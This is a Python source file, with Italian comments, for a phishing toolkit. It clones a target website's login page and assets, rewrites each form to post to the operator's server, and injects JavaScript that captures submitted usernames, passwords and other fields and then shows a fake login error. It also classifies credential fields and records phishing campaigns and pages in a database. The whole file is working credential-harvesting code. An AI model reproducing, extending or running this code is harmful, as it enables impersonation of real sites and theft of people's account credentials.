from urllib.parse import urljoin, urlparse
import requests
from bs4 import BeautifulSoup
from pathlib import Path
from typing import Optional, cast, Dict
import logging
import re
import hashlib
import mimetypes

logger = logging.getLogger(__name__)


class AdvancedPageCloner:
    """Advanced page cloner with complete resource management"""
    
    def __init__(self, target_url: str, output_dir: str = "cloned_pages"):
        self.target_url = target_url
        self.output_dir = Path(output_dir)
        self.domain = urlparse(target_url).netloc
        self.page_dir = self.output_dir / self._sanitize_domain(self.domain)
        self.resources_dir = self.page_dir / "resources"
        self.downloaded_resources: Dict[str, str] = {}
        
        # Create directories
        self.page_dir.mkdir(parents=True, exist_ok=True)
        self.resources_dir.mkdir(exist_ok=True)
        
        logger.info(f"AdvancedPageCloner initialized for {target_url}")
    
    def _sanitize_domain(self, domain: str) -> str:
        """Sanitize domain name for use as folder name"""
        return domain.replace(':', '_').replace('/', '_')
    
    def _get_resource_hash(self, url: str) -> str:
        """Generate unique hash for resource (prevents duplicates)"""
        return hashlib.md5(url.encode()).hexdigest()[:12]
    
    def _download_resource(self, url: str, resource_type: str = "generic") -> str:
        """Download external resource (CSS, JS, images, fonts)"""
        try:
            # Return cached if already downloaded
            if url in self.downloaded_resources:
                return self.downloaded_resources[url]
            
            response = requests.get(url, timeout=10, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            response.raise_for_status()
            
            # Determine extension from content-type
            content_type = response.headers.get('content-type', '').split(';')[0]
            ext = mimetypes.guess_extension(content_type) or '.bin'
            
            # Filename: hash + extension
            filename = f"{resource_type}_{self._get_resource_hash(url)}{ext}"
            local_path = self.resources_dir / filename
            
            # Save file
            with open(local_path, 'wb') as f:
                f.write(response.content)
            
            # Relative path for HTML
            relative_path = f"resources/{filename}"
            self.downloaded_resources[url] = relative_path
            
            logger.info(f"Downloaded: {url} → {relative_path}")
            return relative_path
            
        except Exception as e:
            logger.error(f"Failed to download {url}: {e}")
            return url  # Fallback: use original URL
    
    def _process_css(self, css_content: str, base_url: str) -> str:
        """Process CSS to download referenced resources (fonts, images)"""
        
        # Pattern for url() in CSS
        url_pattern = re.compile(r'url\(["\']?([^"\')]+)["\']?\)')
        
        def replace_url(match):
            resource_url = match.group(1)
            # Resolve relative URLs
            absolute_url = urljoin(base_url, resource_url)
            local_path = self._download_resource(absolute_url, "css_resource")
            return f'url("{local_path}")'
        
        return url_pattern.sub(replace_url, css_content)
    
    def _inject_capture_script(self, soup: BeautifulSoup, campaign_id: Optional[str] = None, 
                              page_name: Optional[str] = None) -> BeautifulSoup:
        """Inject JavaScript to capture credentials"""
        capture_script = f"""
        <script>
        (function() {{
            // Intercept all forms
            document.addEventListener('DOMContentLoaded', function() {{
                const forms = document.querySelectorAll('form');
                
                forms.forEach(form => {{
                    form.addEventListener('submit', function(e) {{
                        e.preventDefault();
                        
                        // Collect form data
                        const formData = new FormData(form);
                        const data = {{}};
                        formData.forEach((value, key) => {{
                            data[key] = value;
                        }});
                        
                        // Send to our server
                        fetch('/submit_credentials', {{
                            method: 'POST',
                            headers: {{
                                'Content-Type': 'application/json',
                            }},
                            body: JSON.stringify({{
                                ...data,
                                campaign_id: '{campaign_id or ""}',
                                page_name: '{page_name or ""}',
                                timestamp: new Date().toISOString()
                            }})
                        }})
                        .then(response => response.json())
                        .then(result => {{
                            // Redirect to legitimate page or show fake error
                            if (result.redirect_url) {{
                                window.location.href = result.redirect_url;
                            }} else {{
                                // Simulate login error
                                alert('Invalid username or password. Please try again.');
                                form.reset();
                            }}
                        }})
                        .catch(error => {{
                            console.error('Error:', error);
                            alert('An error occurred. Please try again later.');
                        }});
                    }});
                }});
            }});
        }})();
        </script>
        """
        
        # Add script before </body>
        body = soup.find('body')
        if body:
            script_tag = BeautifulSoup(capture_script, 'html.parser')
            body.append(script_tag)
        
        return soup
    
    def clone_page(self, campaign_id: Optional[str] = None, inject_script: bool = True) -> Dict:
        """
        Clone complete page with all resources.
        
        Returns:
            dict: {
                'html_path': cloned HTML file path,
                'page_name': identifier name,
                'original_url': original URL,
                'resources_count': number of downloaded resources,
                'page_dir': directory containing page and resources
            }
        """
        logger.info(f"Cloning page: {self.target_url}")
        
        # 1. Download main HTML
        try:
            response = requests.get(self.target_url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            response.raise_for_status()
        except Exception as e:
            logger.error(f"Failed to fetch {self.target_url}: {e}")
            raise
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # 2. Process and download CSS
        for link in soup.find_all('link', rel='stylesheet'):
            if link.get('href'):
                css_url = urljoin(self.target_url, link['href'])
                local_css = self._download_resource(css_url, "css")
                
                # Download resources inside CSS
                try:
                    css_response = requests.get(css_url, timeout=10)
                    processed_css = self._process_css(css_response.text, css_url)
                    
                    # Overwrite local CSS with processed version
                    css_path = self.page_dir / local_css
                    css_path.parent.mkdir(parents=True, exist_ok=True)
                    with open(css_path, 'w', encoding='utf-8') as f:
                        f.write(processed_css)
                except Exception as e:
                    logger.warning(f"Could not process CSS {css_url}: {e}")
                
                link['href'] = local_css
        
        # 3. Process and download JavaScript
        for script in soup.find_all('script', src=True):
            js_url = urljoin(self.target_url, script['src'])
            local_js = self._download_resource(js_url, "js")
            script['src'] = local_js
        
        # 4. Process images
        for img in soup.find_all('img', src=True):
            img_url = urljoin(self.target_url, img['src'])
            local_img = self._download_resource(img_url, "img")
            img['src'] = local_img
        
        # 5. Process favicon
        for link in soup.find_all('link', rel='icon'):
            if link.get('href'):
                icon_url = urljoin(self.target_url, link['href'])
                local_icon = self._download_resource(icon_url, "icon")
                link['href'] = local_icon
        
        # 6. Modify form actions
        for form in soup.find_all('form'):
            original_action = form.get('action', '')
            form['data-original-action'] = original_action
            form['action'] = '/submit_credentials'
            form['method'] = 'post'
        
        # 7. Inject capture script (optional)
        if inject_script:
            page_name = self._sanitize_domain(self.domain)
            soup = self._inject_capture_script(soup, campaign_id, page_name)
        
        # 8. Save final HTML
        html_filename = f"{self._sanitize_domain(self.domain)}_cloned.html"
        html_path = self.page_dir / html_filename
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(str(soup))
        
        logger.info(f"Page cloned successfully: {html_path}")
        
        return {
            'html_path': str(html_path),
            'page_name': self._sanitize_domain(self.domain),
            'original_url': self.target_url,
            'resources_count': len(self.downloaded_resources),
            'page_dir': str(self.page_dir)
        }


def clone_webpage(url: str, page_name: str, save_dir: Path) -> Path | None:
    """
    Clona una pagina web, modifica i form per catturare credenziali,
    e la salva nella directory specificata.
    """
    try:
        response = requests.get(url, allow_redirects=True, timeout=10)
        response.raise_for_status()
        html_content = response.text

        soup = BeautifulSoup(html_content, 'html.parser')

        # === Modifiche per il Phishing ===
        # 1. Modifica action degli `<form>`: Punta al nostro server di phishing
        for form in soup.find_all('form'):
            # Punta al server locale per la cattura delle credenziali
            form['action'] = f'/{page_name}'
            form['method'] = 'POST'
            logger.info(f"Modificato form action in: {form['action']}")

            # Inserisci un campo nascosto per l'identificazione della campagna/pagina
            hidden_input = soup.new_tag("input")
            hidden_input['type'] = 'hidden'
            hidden_input['name'] = 'phish_page_id'
            hidden_input['value'] = page_name
            form.append(hidden_input)

            # Applica la logica per l'identificazione dei campi
            enhance_form_fields(form, soup)

        # 2. Riscrivi URL relativi in assoluti (immagini, CSS, JS)
        base_url = url
        for tag in soup.find_all(['a', 'img', 'link', 'script']):
            if 'href' in tag.attrs:
                tag['href'] = urljoin(base_url, tag['href'])
            if 'src' in tag.attrs:
                tag['src'] = urljoin(base_url, tag['src'])

        # Salva la pagina modificata
        output_file = save_dir / f"{page_name}.html"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(str(soup))
        
        logger.info(f"Pagina '{page_name}' clonata e modificata. Salvata in {output_file}")
        return output_file
        
    except requests.exceptions.RequestException as e:
        logger.error(f"Errore di rete o HTTP durante la clonazione di {url}: {e}")
        return None
    except Exception as e:
        logger.error(f"Errore sconosciuto durante la clonazione di {url}: {e}", exc_info=True)
        return None


def enhance_form_fields(form, soup):
    """
    Migliora i campi del form per garantire che siano identificabili dalla funzione guess_credentials.
    Mantiene i nomi originali quando possibile, altrimenti assegna nomi significativi.
    """
    # Pattern per identificare i tipi di campo (coerenti con guess_credentials)
    password_patterns = [
        r'.*pass.*', r'.*pwd.*', r'.*secret.*', r'.*pin.*', 
        r'.*auth.*', r'.*credential.*', r'.*secure.*'
    ]
    email_patterns = [
        r'.*e?mail.*', r'.*@.*', r'.*addr.*', r'.*contact.*'
    ]
    username_patterns = [
        r'.*user.*', r'.*login.*', r'.*account.*', r'.*name.*', 
        r'.*id.*', r'.*nick.*', r'.*handle.*', r'.*matricola.*',
        r'.*studente.*', r'.*codice.*', r'.*utente.*', r'.*cliente.*',
        r'.*tessera.*', r'.*badge.*', r'.*dipendente.*'
    ]
    def matches_any_pattern(text: str, patterns: list) -> bool:
        if not text:
            return False
        text_lower = text.lower()
        return any(re.match(pattern, text_lower, re.IGNORECASE) for pattern in patterns)
    def get_field_attributes(input_tag) -> dict:
        return {
            'name': input_tag.get('name', ''),
            'id': input_tag.get('id', ''),
            'type': input_tag.get('type', '').lower(),
            'class': ' '.join(input_tag.get('class', [])),
            'placeholder': input_tag.get('placeholder', ''),
            'autocomplete': input_tag.get('autocomplete', ''),
        }
    def classify_field(attrs: dict) -> str:
        combined_text = f"{attrs['name']} {attrs['id']} {attrs['class']} {attrs['placeholder']} {attrs['autocomplete']}"
        if attrs['type'] == 'password' or matches_any_pattern(combined_text, password_patterns):
            return 'password'
        elif attrs['type'] == 'email' or matches_any_pattern(combined_text, email_patterns):
            return 'email'
        elif attrs['type'] in ['text', 'tel'] or matches_any_pattern(combined_text, username_patterns):
            return 'username'
        else:
            return 'unknown'
    def ensure_field_name(input_tag, field_type: str, counter: dict):
        current_name = input_tag.get('name', '')
        if not current_name:
            if field_type == 'password':
                if counter['password'] == 0:
                    input_tag['name'] = 'password'
                else:
                    input_tag['name'] = f'password_{counter["password"]}'
                counter['password'] += 1
            elif field_type == 'email':
                if counter['email'] == 0:
                    input_tag['name'] = 'email'
                else:
                    input_tag['name'] = f'email_{counter["email"]}'
                counter['email'] += 1
            elif field_type == 'username':
                if counter['username'] == 0:
                    input_tag['name'] = 'username'
                else:
                    input_tag['name'] = f'username_{counter["username"]}'
                counter['username'] += 1
            logger.info(f"Assegnato nome '{input_tag['name']}' a campo {field_type}")
        else:
            if field_type == 'password' and not matches_any_pattern(current_name, password_patterns):
                input_tag['data-field-type'] = 'password'
                logger.info(f"Campo password con nome non standard: '{current_name}'")
            elif field_type == 'email' and not matches_any_pattern(current_name, email_patterns):
                input_tag['data-field-type'] = 'email'
                logger.info(f"Campo email con nome non standard: '{current_name}'")
            elif field_type == 'username' and not matches_any_pattern(current_name, username_patterns):
                input_tag['data-field-type'] = 'username'
                logger.info(f"Campo username con nome non standard: '{current_name}'")
    field_counters = {'password': 0, 'email': 0, 'username': 0}
    for input_tag in form.find_all('input'):
        attrs = get_field_attributes(input_tag)
        if attrs['type'] in ['hidden', 'submit', 'button', 'reset', 'file', 'image']:
            continue
        field_type = classify_field(attrs)
        if field_type != 'unknown':
            ensure_field_name(input_tag, field_type, field_counters)
        else:
            if not attrs['name']:
                input_tag['name'] = f'field_{len(form.find_all("input"))}'
                logger.info(f"Assegnato nome generico '{input_tag['name']}' a campo non classificato")
    for select_tag in form.find_all('select'):
        if not select_tag.get('name'):
            select_tag['name'] = f'select_{len(form.find_all('select'))}'
    for textarea_tag in form.find_all('textarea'):
        if not textarea_tag.get('name'):
            textarea_tag['name'] = f'textarea_{len(form.find_all('textarea'))}'


def save_phishing_page_to_db(db_manager, campaign_entity_id: int | None, page_name: str, original_url: str, cloned_path: str):
    """
    Salva i dettagli della pagina di phishing nel database utilizzando il sistema di entità.
    """
    try:
        # Estrai il dominio dall'URL originale
        parsed_url = urlparse(original_url)
        domain = parsed_url.netloc
        
        # Ottieni o crea l'entità dominio
        domain_entity_id = db_manager.get_or_create_entity(domain, "domain")
        
        # Ottieni o crea l'entità per il nome della pagina (trattata come "email" per compatibilità)
        page_entity_id = db_manager.get_or_create_entity(page_name, "email")
        
        # Salva i dettagli della pagina nel database
        with db_manager.transaction() as cursor:
            cursor.execute("""
                INSERT INTO phishing_pages (
                    campaign_entity_id, 
                    page_entity_id, 
                    domain_entity_id, 
                    name, 
                    original_url, 
                    cloned_path,
                    created_at
                ) VALUES (?, ?, ?, ?, ?, ?, datetime('now'))
            """, (
                campaign_entity_id,
                page_entity_id,
                domain_entity_id,
                page_name,
                original_url,
                str(cloned_path)
            ))
            
            page_id = cursor.lastrowid
            logger.info(f"Dettagli pagina '{page_name}' salvati nel DB con ID: {page_id}")
            
            return page_id
            
    except Exception as e:
        logger.error(f"Errore salvataggio dettagli pagina nel DB: {e}", exc_info=True)
        return None


def get_phishing_page_by_name(db_manager, page_name: str) -> dict | None:
    """
    Recupera i dettagli di una pagina di phishing dal database.
    """
    try:
        with db_manager.transaction() as cursor:
            cursor.execute("""
                SELECT pp.*, 
                       e_page.name as page_entity_name,
                       e_domain.name as domain_entity_name,
                       e_campaign.name as campaign_entity_name
                FROM phishing_pages pp
                LEFT JOIN entities e_page ON pp.page_entity_id = e_page.id
                LEFT JOIN entities e_domain ON pp.domain_entity_id = e_domain.id
                LEFT JOIN entities e_campaign ON pp.campaign_entity_id = e_campaign.id
                WHERE pp.name = ?
            """, (page_name,))
            
            result = cursor.fetchone()
            if result:
                return dict(result)
            return None
            
    except Exception as e:
        logger.error(f"Errore recupero pagina dal DB: {e}", exc_info=True)
        return None


def create_phishing_campaign(db_manager, campaign_name: str, description: str = "") -> int | None:
    """
    Crea una nuova campagna di phishing nel database.
    """
    try:
        # Crea l'entità per la campagna
        campaign_entity_id = db_manager.get_or_create_entity(campaign_name, "email")
        
        # Salva i dettagli della campagna
        with db_manager.transaction() as cursor:
            cursor.execute("""
                INSERT INTO phishing_campaigns (
                    entity_id, 
                    name, 
                    description, 
                    created_at, 
                    status
                ) VALUES (?, ?, ?, datetime('now'), 'active')
            """, (campaign_entity_id, campaign_name, description))
            
            campaign_id = cursor.lastrowid
            logger.info(f"Campagna '{campaign_name}' creata con ID: {campaign_id}")
            
            return campaign_entity_id
            
    except Exception as e:
        logger.error(f"Errore creazione campagna: {e}", exc_info=True)
        return None


# Esempio di utilizzo
def setup_phishing_page(db_manager, url: str, page_name: str, save_dir: Path, campaign_name: str = None) -> bool:
    """
    Funzione di utilità che combina la clonazione della pagina e il salvataggio nel database.
    """
    try:
        # Crea la campagna se specificata
        campaign_entity_id = None
        if campaign_name:
            campaign_entity_id = create_phishing_campaign(db_manager, campaign_name)
        
        # Clona la pagina web
        cloned_path = clone_webpage(url, page_name, save_dir)
        if not cloned_path:
            logger.error("Fallimento clonazione pagina")
            return False
        
        # Salva nel database
        page_id = save_phishing_page_to_db(
            db_manager, 
            campaign_entity_id, 
            page_name, 
            url, 
            cloned_path
        )
        
        if page_id:
            logger.info(f"Setup completato per pagina '{page_name}'")
            return True
        else:
            logger.error("Fallimento salvataggio nel database")
            return False
            
    except Exception as e:
        logger.error(f"Errore durante setup pagina phishing: {e}", exc_info=True)
        return False